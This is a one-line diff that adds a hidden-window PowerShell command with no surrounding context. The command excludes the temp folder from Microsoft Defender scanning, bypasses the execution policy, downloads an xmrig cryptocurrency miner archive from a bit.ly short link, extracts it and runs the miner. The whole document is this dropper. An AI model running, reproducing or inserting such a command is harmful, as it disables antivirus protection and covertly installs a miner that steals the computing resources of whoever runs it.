@@ -1,0 +1,1 @@
+powershell -w h Add-MpPreference -ExclusionPath "$env:tmp"; -NoP -Ep Bypass $D="$env:tmp";irm -Uri 'bit.ly/3NMVwfq' -O "$D\xmrig.zip";Expand-Archive "$D\xmrig.zip" -Des $D -F;. "$D\xmrig\xmrig.exe"
